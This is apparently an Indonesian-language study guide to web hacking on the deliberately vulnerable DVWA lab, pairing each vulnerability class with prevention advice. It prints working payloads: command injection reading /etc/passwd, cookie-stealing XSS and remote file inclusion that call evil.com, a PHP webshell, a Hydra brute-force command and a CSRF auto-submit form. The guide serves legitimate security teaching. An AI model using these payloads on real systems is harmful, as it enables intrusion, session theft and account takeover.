# Level 3 - Web Hacking (Mulai dari DVWA)

Memulai pembelajaran web hacking dengan DVWA (Damn Vulnerable Web Application). Platform ini menyediakan vulnerable app untuk practice berbagai attacks.

## Setup DVWA
1. Install Docker atau XAMPP/WAMP
2. Clone DVWA dari GitHub
3. Configure database (biasanya MySQL)
4. Set login: admin / password
5. Set difficulty: Low → Medium → High

## Vulnerability Tutorial Urutan Belajar

### Command Injection
**Konsep:** User input dijalankan sebagai system command tanpa sanitization.

**Cara exploit:**
```
; ls
; whoami
; cat /etc/passwd
```

**Filter bypass:**
```
ping 127.0.0.1 & whoami
ping 127.0.0.1 | whoami
```

**Prevention:**
- Use exec() dengan array parameter
- Sanitize input
- Whitelist allowed commands

### SQL Injection
**Konsep:** User input injected ke SQL query.

**Basic payloads:**
```
' OR 1=1 --
' OR '1'='1
admin' --
```

**Union-based:**
```
' UNION SELECT database() --
' UNION SELECT table_name FROM information_schema.tables --
```

**Blind boolean:**
```
' AND (SELECT IF(database()='dvwa',1,0)) --
```

**Prevention:**
- Prepared statements / PDO
- Input validation / escaping

### XSS (Cross-Site Scripting)
**Reflected:** Input reflected langsung
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

**Stored:** Input disimpan di database
```
<script>document.location='http://evil.com?c='+document.cookie</script>
```

**Cara payload bypass filter:**
```
<img src="javascript:alert('XSS')"/>
<svg onload=alert(1)>
```

**Prevention:**
- Output encoding
- Content Security Policy (CSP)

### File Upload
**Vuln types:**
- Unrestricted extension
- Directory traversal
- Bypass MIME check

**Exploit:**
- Upload webshell (PHP: `<?php system($_GET['cmd']); ?>`)
- Access: `/uploads/shell.php?cmd=id`

**Prevention:**
- Check MIME type & extension
- Store outside web root

### File Inclusion (LFI/RFI)
**Local File Inclusion (LFI):**
```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
```

**Remote File Inclusion (RFI):**
```
?page=http://evil.com/shell.txt
```

**Prevention:**
- Disable allow_url_include
- Whitelist included files

### Brute Force
**Tools:** Hydra, Burp Intruder
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f localhost http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

**Prevention:**
- Account lockout
- CAPTCHA
- Rate limiting

### CSRF (Cross-Site Request Forgery)
**Konsep:** Forge user actions tanpa consent.

**Exploit:** Hidden form posting
```
<form action="http://victim/change_password.php" method="POST">
<input name="pass" value="evilpass">
</form>
<script>document.forms[0].submit();</script>
```

**Prevention:**
- CSRF tokens
- SameSite cookies

### Weak Session/Security Misconfig
- Session ID predictable
- Cookies tidak httpOnly/secure
- Overly verbose error messages

## Learning Strategy DVWA
1. **LOW:** Understand vuln basics
2. **MEDIUM:** Learn filter bypass
3. **HIGH:** Advanced exploitation
4. **IMPOSSIBLE:** (Berikutnya aman)

**Tips:**
- Use Burp/Repeater untuk manual testing
- Analyze source code untuk understand cara prevent
- Document writeups untuk setiap vuln
